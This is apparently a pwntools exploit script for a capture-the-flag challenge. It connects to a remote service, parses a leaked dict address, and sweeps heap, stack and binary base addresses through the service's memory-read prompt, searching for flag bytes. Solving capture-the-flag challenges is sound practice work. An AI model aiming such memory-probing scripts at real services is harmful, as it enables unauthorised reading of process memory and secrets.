from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

def test_address(addr_to_test):
    """Test a single address and return the data if readable"""
    try:
        io = remote(HOST, PORT, ssl=True)
        
        # Skip banners
        intro = io.recvline_contains(b'flag is over at').decode()
        banner2 = io.recvline().decode()
        
        # Extract dict base for reference
        m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
        base = int(m.group(1), 16)
        
        # Send our test address
        io.sendline(hex(addr_to_test).encode())
        line = io.recvline(timeout=3).decode().strip()
        
        io.close()
        
        if 'illegal memory address' in line:
            return None
        try:
            _, data = line.split(': ')
            raw_data = bytes.fromhex(data.strip())
            return raw_data, base
        except:
            return None
            
    except:
        return None

print("=== Searching for readable memory regions ===")

# Test some common address patterns where flag data might be stored
test_addresses = []

# Add some common heap/stack patterns
for base_addr in [0x555555554000, 0x7ffff7a00000, 0x7ffe00000000, 0x400000]:
    for offset in [0, 0x1000, 0x2000, 0x10000]:
        test_addresses.append(base_addr + offset)

# Also test some addresses relative to the dict address we get each time
# We'll get the dict base from the first connection
io = remote(HOST, PORT, ssl=True)
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_base = int(m.group(1), 16)
io.close()

# Test addresses around the heap base (assuming the dict base gives us heap info)
heap_base = dict_base & ~0xfffff  # Round down to 1MB boundary
print(f"Dict at {dict_base:#x}, trying heap base {heap_base:#x}")

for offset in range(0, 0x100000, 0x1000):  # Test every 4K in first 1MB
    addr = heap_base + offset
    test_addresses.append(addr)

# Remove duplicates and sort
test_addresses = sorted(set(test_addresses))

print(f"Testing {len(test_addresses)} addresses...")

found_data = []
for i, addr in enumerate(test_addresses[:30]):  # Limit to 30 tests
    print(f"[{i+1}/30] Testing {addr:#x}...", end='')
    result = test_address(addr)
    
    if result:
        data, base = result
        chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
        print(f" SUCCESS: {data.hex()} = '{chars}'")
        found_data.append((addr, data, chars))
        
        # Check for flag patterns
        if any(pattern in chars for pattern in ['K', 'C', 'S', '{', '}', 'flag']):
            print(f"  *** POTENTIAL FLAG DATA: '{chars}' ***")
    else:
        print(" failed")

if found_data:
    print(f"\n=== Summary: Found {len(found_data)} readable addresses ===")
    for addr, data, chars in found_data:
        print(f"{addr:#x}: '{chars}'")
else:
    print("\nNo readable memory found in tested ranges")
    print("The flag data might be in a different location or require a different approach")